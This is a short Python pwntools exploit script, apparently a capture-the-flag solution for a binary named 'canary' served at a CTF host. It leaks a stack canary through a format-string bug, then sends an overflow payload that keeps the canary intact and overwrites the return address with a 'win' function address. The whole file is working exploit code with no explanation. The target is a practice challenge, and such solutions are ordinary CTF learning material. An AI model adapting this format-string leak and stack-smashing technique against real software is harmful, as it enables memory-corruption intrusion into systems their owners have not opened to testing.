#!/usr/bin/env python3
import sys
from pwn import *

win_func = 0x400787

def find_canary():
    for x in range(1, 20):
        p = process('./canary')
        p.sendline('%{}$p'.format(x).encode('ascii'))
        p.recvuntil(b'Nice')
        print('N:', x)
        print('Value:', p.recvline().decode('ascii'))
        p.close()


if __name__ == '__main__':
    if 'debug' in sys.argv:
        p = gdb.debug('./canary', '''b greet
                c''')
    elif 'local' in sys.argv:
        p = process('./canary')
    elif 'leak' in sys.argv:
        find_canary()
        sys.exit()
    else:
        p = remote('shell.actf.co', 20701)

    p.sendline('%{}$p'.format(17).encode('ascii'))
    p.recvuntil(b'Nice to meet you, ')
    canary = int(p.recvuntil(b'!')[:-1].decode('ascii'), 16)
    print('Canary: {}'.format(hex(canary)))

    exploit = b'a' * (0x40 - 0x8) + p64(canary) + b'a' * 8 + p64(win_func)
    p.sendline(exploit)
    print(p.recvall().decode('ascii'))
